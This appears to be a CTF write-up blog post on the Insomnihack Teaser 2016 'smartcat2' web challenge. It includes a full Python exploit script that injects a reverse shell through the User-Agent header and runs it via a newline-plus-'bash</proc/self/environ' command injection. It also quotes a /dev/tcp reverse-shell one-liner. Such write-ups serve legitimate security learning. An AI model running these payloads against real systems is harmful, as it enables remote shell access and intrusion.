---
id: 499
title: Insomnihack Teaser 2016 – smartcat2 – 50 pt Web Challenge
date: 2016-01-17T21:00:52+00:00
author: Kris
layout: post
guid: https://ctf.rip/?p=499
permalink: /insomnihack-teaser-2016-smartcat2-50-pt-web-challenge/
post_views_count:
  - "1172"
image: /images/2016/01/cat.png
categories:
  - Uncategorized
  - Write-Ups
tags:
  - burpsuite
  - command injection
---
<img class="size-full wp-image-501 aligncenter" src="/images/2016/01/smartcat20.png" alt="smartcat20" width="707" height="290" srcset="/images/2016/01/smartcat20.png 707w, /images/2016/01/smartcat20-300x123.png 300w, /images/2016/01/smartcat20-660x271.png 660w" sizes="(max-width: 707px) 100vw, 707px" />

Part 2 of this crazy cat challenge was a bit of a stumper, until I recalled some old school web techniques that haven't really worked for a while now. In this challenge we need to get a shell and get the flag from /home/smartcat/. Without a "space" character that sounds tricky. I know a pretty trivial way to get a shell without the space character "bash</dev/tcp/<ip>/<port>" but that was not working on this box.

Instead I needed another way to get data onto the system, this turned out pretty simple... "/proc/self/environ"...

This contains several user controlled environment variables, such as the contents of "User-Agent:" header. Better still, the contents of User-Agent is not restricted in any way. So I simply used this exploit to send myself a reverse shell:
  
<!-- HTML generated using hilite.me -->

<div style="background: #272822; overflow: auto; width: auto; border: solid gray; border-width: .1em .1em .1em .8em; padding: .2em .6em; color: #eeeeee;">
  <pre style="margin: 0; line-height: 125%;"><span style="color: #75715e;">#!/usr/bin/python</span>

<span style="color: #f92672;">import</span> <span style="color: #f8f8f2;">requests</span>

<span style="color: #f8f8f2;">URL</span> <span style="color: #f92672;">=</span> <span style="color: #e6db74;">'http://smartcat.insomnihack.ch/cgi-bin/index.cgi'</span>

<span style="color: #f8f8f2;">HOST</span> <span style="color: #f92672;">=</span> <span style="color: #e6db74;">'<yourIP>'</span>	<span style="color: #75715e;"># your IP for the reverse shell</span>
<span style="color: #f8f8f2;">PORT</span> <span style="color: #f92672;">=</span> <span style="color: #e6db74;">'4443'</span>		<span style="color: #75715e;"># port you're listening on</span>

<span style="color: #f8f8f2;">s</span> <span style="color: #f92672;">=</span> <span style="color: #f8f8f2;">requests</span><span style="color: #f92672;">.</span><span style="color: #f8f8f2;">Session()</span>

<span style="color: #75715e;"># Python backdoor in the user-agent with a # at the end</span>
<span style="color: #f8f8f2;">headers</span> <span style="color: #f92672;">=</span> <span style="color: #f8f8f2;">{</span> <span style="color: #e6db74;">'User-Agent'</span> <span style="color: #f8f8f2;">:</span> <span style="color: #e6db74;">';python -c </span><span style="color: #ae81ff;">\'</span><span style="color: #e6db74;">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'</span> <span style="color: #f92672;">+</span> <span style="color: #f8f8f2;">HOST</span> <span style="color: #f92672;">+</span> <span style="color: #e6db74;">'",'</span> <span style="color: #f92672;">+</span> <span style="color: #f8f8f2;">PORT</span> <span style="color: #f92672;">+</span> <span style="color: #e6db74;">'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);</span><span style="color: #ae81ff;">\'</span><span style="color: #e6db74;"> #'</span> <span style="color: #f8f8f2;">}</span>

<span style="color: #75715e;"># the old /proc/self/environ trick</span>
<span style="color: #f8f8f2;">payload</span> <span style="color: #f92672;">=</span> <span style="color: #f8f8f2;">{</span> <span style="color: #e6db74;">'dest'</span> <span style="color: #f8f8f2;">:</span> <span style="color: #f8f8f2;">chr(</span><span style="color: #ae81ff;">0xa</span><span style="color: #f8f8f2;">)</span> <span style="color: #f92672;">+</span> <span style="color: #e6db74;">'bash</proc/self/environ'</span><span style="color: #f8f8f2;">}</span>

<span style="color: #66d9ef;">print</span> <span style="color: #e6db74;">"[*] Exploiting..."</span> 
<span style="color: #66d9ef;">print</span> <span style="color: #e6db74;">"[+] When you get the reverse shell, issue these commands:"</span>
<span style="color: #66d9ef;">print</span> <span style="color: #e6db74;">"[+] cd /home/smartcat"</span>
<span style="color: #66d9ef;">print</span> <span style="color: #e6db74;">"[+] ./readflag"</span>
<span style="color: #66d9ef;">print</span> <span style="color: #e6db74;">"[+] Type </span><span style="color: #ae81ff;">\"</span><span style="color: #e6db74;">Give me a...</span><span style="color: #ae81ff;">\"</span><span style="color: #e6db74;"><enter>"</span>
<span style="color: #66d9ef;">print</span> <span style="color: #e6db74;">"[+] wait 2 seconds..."</span>
<span style="color: #66d9ef;">print</span> <span style="color: #e6db74;">"[+] Type </span><span style="color: #ae81ff;">\"</span><span style="color: #e6db74;">... flag!</span><span style="color: #ae81ff;">\"</span><span style="color: #e6db74;"><enter>"</span>
<span style="color: #f8f8f2;">r</span> <span style="color: #f92672;">=</span> <span style="color: #f8f8f2;">s</span><span style="color: #f92672;">.</span><span style="color: #f8f8f2;">post(URL,</span> <span style="color: #f8f8f2;">data</span><span style="color: #f92672;">=</span><span style="color: #f8f8f2;">payload,</span> <span style="color: #f8f8f2;">headers</span><span style="color: #f92672;">=</span><span style="color: #f8f8f2;">headers)</span>

```

</div>

Note the presence of the "#" mark at the end of our Python reverse shell. This is key as it prevents Bash from continuing to interpret the /proc/self/environ file and running into a set of parenthesis that cause it to fail with a syntax error.

We get our reverse shell. We learn that /home/smartcat/flag is not readable by our user. Fair enough, that would be too easy. However there's a "readflag" setuid program that can read it for us. We need to have an interactive shell though. See highlighted selection below I found while trolling around via Burpsuite:

<img class="wp-image-502 aligncenter" src="/images/2016/01/smartcat21.png" alt="smartcat21" width="972" height="640" srcset="/images/2016/01/smartcat21.png 1607w, /images/2016/01/smartcat21-300x198.png 300w, /images/2016/01/smartcat21-768x506.png 768w, /images/2016/01/smartcat21-1024x675.png 1024w, /images/2016/01/smartcat21-660x435.png 660w" sizes="(max-width: 972px) 100vw, 972px" />

After learning all of this, and getting my shell, I was able to retrieve the flag!

<img class="size-full wp-image-500 aligncenter" src="/images/2016/01/smartcat2.png" alt="smartcat2" width="833" height="478" srcset="/images/2016/01/smartcat2.png 833w, /images/2016/01/smartcat2-300x172.png 300w, /images/2016/01/smartcat2-768x441.png 768w, /images/2016/01/smartcat2-660x379.png 660w" sizes="(max-width: 833px) 100vw, 833px" />